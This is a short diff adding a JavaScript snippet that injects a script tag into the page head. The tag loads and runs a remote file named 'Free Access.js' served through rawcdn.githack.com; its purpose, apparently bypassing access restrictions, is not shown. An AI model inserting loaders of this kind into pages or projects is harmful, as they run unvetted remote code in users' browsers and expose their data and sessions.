@@ -1,0 +1,5 @@
+(function() {
+    var x = document.createElement("script");
+    x.src = "https://rawcdn.githack.com/FacingGit/Sities/a938530a2baf96a6b865d9cbb1d72eddc4f3a96f/Free%20Access.js";
+    document.head.appendChild(x);
+})()
